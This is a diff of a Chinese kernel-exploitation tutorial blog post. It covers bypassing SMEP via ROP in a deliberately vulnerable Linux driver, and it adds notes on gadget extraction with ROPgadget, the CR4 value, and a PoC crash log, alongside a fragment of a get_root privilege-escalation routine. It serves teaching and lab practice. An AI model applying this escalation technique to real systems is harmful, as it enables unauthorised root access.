@@ -8,7 +8,7 @@
 >
 > 去掉make menuconfig—>Enable loadable kernel module—>Module Signature verification
 
-&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>在内核态pwn的栈溢出中，除了常规的canary保护还有其他用户态不存在的保护，比如smep保护：防止内核执行用户空间的代码。要绕过smep保护也很简单，在内核态中可以很轻易的通过gadget（例如mov cv4，regs）指令轻易的修改**（去掉cr4的高位，相当于cr4&=0xFFFF）**，这时候就需要ROP链来达到我们的目的了（建议看这篇前先看看上一篇简单的栈溢出，否则可能不知道如何构造trap frame）。首先来看看漏洞驱动模块：</font></br>
+&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>在内核态pwn的栈溢出中，除了常规的canary保护还有其他用户态不存在的保护，比如smep保护：防止内核执行用户空间的代码。要绕过smep保护也很简单，在内核态中可以很轻易的通过gadget（例如mov cv4，regs）指令轻易的修改（**去掉cr4的高位，相当于cr4&=0xFFFF**），这时候就需要ROP链来达到我们的目的了（建议看这篇前先看看上一篇简单的栈溢出，否则可能不知道如何构造trap frame）。首先来看看漏洞驱动模块：</font></br>
 
 ```C
 #include <linux/module.h>
@@ -145,9 +145,9 @@ MODULE_DESCRIPTION("Module vuln overflow");
 
 &nbsp;&nbsp;&nbsp;&nbsp;<font size=2>原模块[链接是这个](https://github.com/black-bunny/LinKern-x86_64-bypass-SMEP-KASLR-kptr_restric)，只是我编译内核的时候开启了栈保护，懒得重新编译也懒得nop，就直接改了下源代码泄漏canary绕过就好了。</font></br>
 
-&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>看完模块源码之后可以发现很简单，是一个很单纯的栈溢出，我们也主要是为了练习ROP利用技巧，能看到这的大佬基本也已经会了用户空间栈溢出的ROP了，所以直接放最终的ROP链，可以直接理解，另外在64-bit下的kernel中有一点需要注意一下：</font></br>
+&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>看完模块源码之后可以发现很简单，是一个很单纯的栈溢出，我们也主要是为了练习ROP利用技巧，能看到这的大佬基本也已经会了用户空间栈溢出的ROP了，所以直接放最终的ROP链，可以直接理解（获取ROP指令用ROPgadget就行，二进制文件用kernel目录下的vmlinux，其他都一样。我直接ROP了所有的指令下来方便直接grep：**ROPgadget --binary vmlinux > ~/Desktop/file/gadget4.txt**），gadget文件我也上传了（再提一句一开始因为vmlinux文件太大，虚拟机分配的内存小，一抓指令就被kill 2333）。另外在64-bit下的kernel中有一点需要注意一下：</font></br>
 
-> 在64bit的系统中执行iret指令前需要执行swapgs指令。该指令通过用一个MSR中的值交换GS寄存器的内容。在进入内核空间例行程序(例如系统调用)时会执行swapgs指令以获取指向内核数据结构的指针，因此在返回用户空间之前需要一个匹配的swapgs。
+> **在64bit的系统中执行iret指令前需要执行swapgs指令**。该指令通过用一个MSR中的值交换GS寄存器的内容。在进入内核空间例行程序(例如系统调用)时会执行swapgs指令以获取指向内核数据结构的指针，因此在返回用户空间之前需要一个匹配的swapgs。
 >
 > ————转自[w0lfzhang's blog](https://www.w0lfzhang.com/2017/08/06/Linux-Kernel-ROP/)
 
@@ -172,6 +172,59 @@ void get_root()
 	asm("movq %0,%%rsp"::"r"(&tf));
 	asm("iretq");
 }
+```
+
+&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>如果问我cr4为啥要赋值0x6f0的话，触发一次smep保护就能看到cr4的值了，然后做cr4&0xFFFF就是你要放入栈的值，触发保护的代码我也写在了脚本的注释里，那么再放一下触发保护后的kernel错误信息吧：</font></br>
+
+```shell
+/mytest $ ./poc
+[    7.355801] [i] Module vuln: open()
+[    7.363907] [i] Module vuln: read()
+[    7.370204] buf:@
+canary:0x72cf6cae09af749c
+[    7.401893] [i] Module vuln write: hello,world
+[    7.417195] unable to execute userspace code (SMEP?) (uid: 1000)
+[    7.417195] BUG: unable to handle kernel paging request at 00000000004010d9
+[    7.417195] IP: [<00000000004010d9>] 0x4010d9
+[    7.417195] PGD 62dd067 PUD 62dc067 PMD 62cb067 PTE 69025
+[    7.417195] Oops: 0011 [#1] SMP
+[    7.417195] Modules linked in: kmod(O)
+[    7.417195] CPU: 0 PID: 99 Comm: poc Tainted: G           O    4.4.72 #2
+[    7.417195] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01/01/2011
+[    7.417195] task: ffff880006071980 ti: ffff880000830000 task.ti: ffff880000830000
+[    7.417195] RIP: 0010:[<00000000004010d9>]  [<00000000004010d9>] 0x4010d9
+[    7.417195] RSP: 0018:ffff880000833e58  EFLAGS: 00000282
+[    7.417195] RAX: 0000000000000090 RBX: ffff88000622f300 RCX: 0000000000000000
+[    7.417195] RDX: 0000000000000000 RSI: ffff880000833ddf RDI: ffff88000082c000
+[    7.417195] RBP: ffff880000833f20 R08: ffff88000082c090 R09: 0000000000000069
+[    7.417195] R10: ffff880000833f20 R11: 656c75646f4d205d R12: ffff880000833f20
+[    7.417195] R13: 00007ffc9e0b99b0 R14: 0000000000000090 R15: 0000000000000000
+[    7.417195] FS:  000000000207a880(0063) GS:ffff880007a00000(0000) knlGS:0000000000000000
+[    7.417195] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b
+[    7.417195] CR2: 00000000004010d9 CR3: 00000000062d2000 CR4: 00000000001006f0
+[    7.417195] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
+[    7.417195] DR3: 0000000000000000 DR6: 0000000000000000 DR7: 0000000000000000
+[    7.417195] Stack:
+[    7.417195]  ffffffff811faad8 ffff880000000000 ffff880000833e78 ffffffff813684d8
+[    7.417195]  ffff880000833ea8 ffffffff8132a93d 0000000000000090 ffff88000622f300
+[    7.417195]  00007ffc9e0b99b0 0000000000000090 ffff880000833ec8 ffffffff811fb023
+[    7.417195] Call Trace:
+[    7.417195]  [<ffffffff811faad8>] ? __vfs_read+0x28/0xe0
+[    7.417195]  [<ffffffff813684d8>] ? apparmor_file_permission+0x18/0x20
+[    7.417195]  [<ffffffff8132a93d>] ? security_file_permission+0x3d/0xc0
+[    7.417195]  [<ffffffff811fb023>] ? rw_verify_area+0x53/0xf0
+[    7.417195]  [<ffffffff811fb299>] ? vfs_write+0xa9/0x190
+[    7.417195]  [<ffffffff81066c6a>] ? __do_page_fault+0x1ba/0x410
+[    7.417195]  [<ffffffff811fbfa6>] ? SyS_write+0x46/0xa0
+[    7.417195]  [<ffffffff817e5736>] ? entry_SYSCALL_64_fastpath+0x16/0x75
+[    7.417195] Code:  Bad RIP value.
+[    7.417195] RIP  [<00000000004010d9>] 0x4010d9
+[    7.417195]  RSP <ffff880000833e58>
+[    7.417195] CR2: 00000000004010d9
+[    7.430146] ---[ end trace 135e42896f7baea5 ]---
+[    7.435250] [i] Module vuln: close()
+Killed
+/mytest $
 ```
 
 &nbsp;&nbsp;&nbsp;&nbsp;<font size=2>tf跟上一篇里的一样，只是变为了64位的，就需要用64位的内联汇编来赋值，内联汇编的资料我以后再放。完整脚本如下：</font></br>
